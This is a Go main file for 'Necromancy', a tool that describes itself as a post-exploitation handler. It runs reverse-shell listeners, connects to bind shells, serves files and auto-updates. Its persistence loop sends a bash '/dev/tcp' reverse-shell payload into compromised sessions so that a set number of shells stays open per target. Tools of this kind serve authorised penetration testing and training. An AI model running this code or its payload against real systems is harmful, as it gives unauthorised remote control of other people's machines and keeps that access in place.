package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/Aryma-f4/necromancy/core"
	"github.com/Aryma-f4/necromancy/server"
	"github.com/Aryma-f4/necromancy/ui"
	"github.com/Aryma-f4/necromancy/updater"
)

// Version variables - will be set by build flags
var (
	Version   = "dev"
	BuildDate = "unknown"
)

func main() {
	printColoredBanner()
	time.Sleep(1 * time.Second) // Tambahkan delay seperti yang diminta

	// Display version info
	fmt.Printf("\n Version : %s ", Version)
	// Replace underscore with space for better display
	displayDate := strings.Replace(BuildDate, "_", " ", 1)
	fmt.Printf("\n Build Date : %s UTC", displayDate)
	fmt.Printf("\n Multi-platform post-exploitation tool with advanced features:\n\n")

	// Set version in updater package
	updater.SetVersion(Version)

	// Parse args
	core.InitConfig()
	flag.StringVar(&core.GlobalConfig.Ports, "p", "4444", "Port to listen on")
	flag.StringVar(&core.GlobalConfig.ServeDir, "s", "", "Run HTTP file server mode and serve directory")
	flag.StringVar(&core.GlobalConfig.Interface, "i", "0.0.0.0", "Local interface/IP to listen")
	flag.StringVar(&core.GlobalConfig.Connect, "c", "", "Bind shell Host")
	flag.IntVar(&core.GlobalConfig.Maintain, "m", 0, "Keep N sessions per target")
	flag.BoolVar(&core.GlobalConfig.NoLog, "L", false, "Disable session log files")
	flag.BoolVar(&core.GlobalConfig.NoUpgrade, "U", false, "Disable shell auto-upgrade")
	flag.BoolVar(&core.GlobalConfig.OSCPSafe, "O", false, "Enable OSCP-safe mode")

	// Auto-update flags
	var checkUpdate bool
	var autoUpdate bool
	flag.BoolVar(&checkUpdate, "check-update", false, "Check for updates")
	flag.BoolVar(&autoUpdate, "update", false, "Auto-update to latest version")

	flag.Parse()

	// Handle auto-update functionality
	if autoUpdate {
		if err := updater.AutoUpdate(); err != nil {
			fmt.Printf("[-] Auto-update failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[✓] Update completed. Please restart the application.")
		os.Exit(0)
	}

	if checkUpdate {
		updater.CheckAndNotify()
		os.Exit(0)
	}

	// Setup logging to file since stdout is used by tview
	f, err := os.OpenFile("necromancy-go.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	log.SetOutput(f)
	log.Println("Starting Necromancy Go Rewrite (Advanced Mode)...")

	// Initialize core Session Manager
	sessions := core.NewSessionManager()

	// Start HTTP File Server if requested
	if core.GlobalConfig.ServeDir != "" {
		fs := server.NewFileServer(core.GlobalConfig.Interface+":8000", core.GlobalConfig.ServeDir)
		go fs.Start()
	}

	// Initialize and run the Tview UI
	app := ui.NewApp(sessions)

	// Handle Listeners or Bind Shell connections
	if core.GlobalConfig.Connect != "" {
		target := fmt.Sprintf("%s:%s", core.GlobalConfig.Connect, core.GlobalConfig.Ports)
		go core.ConnectBind(target, sessions, func(s *core.Session) {
			log.Printf("New Bind Session %d from %s\n", s.ID, s.RemoteAddr)
			app.UpdateSessionsList()
		})
	} else {
		// Default reverse shell listener
		go core.StartListener(core.GlobalConfig.Interface+":"+core.GlobalConfig.Ports, sessions, func(s *core.Session) {
			log.Printf("New Reverse Session %d from %s\n", s.ID, s.RemoteAddr)
			app.UpdateSessionsList()
		})
	}

	// Session Persistence Logic
	if core.GlobalConfig.Maintain > 0 {
		go func() {
			for {
				time.Sleep(10 * time.Second)
				all := sessions.GetAll()
				activeCount := len(all)
				if activeCount > 0 && activeCount < core.GlobalConfig.Maintain {
					log.Printf("Persistence: Active sessions (%d) < Target (%d). Attempting to spawn more...", activeCount, core.GlobalConfig.Maintain)
					// Ask the first active session to spawn another reverse shell
					s := all[0]
					payload := fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1 &' 2>/dev/null\n", core.GlobalConfig.Interface, core.GlobalConfig.Ports)
					s.Write([]byte(payload))
				}
			}
		}()
	}

	app.Setup()

	if err := app.Run(); err != nil {
		log.Fatalf("Error running application UI: %v\n", err)
	}

	fmt.Println("Necromancy Go Exited cleanly.")
}
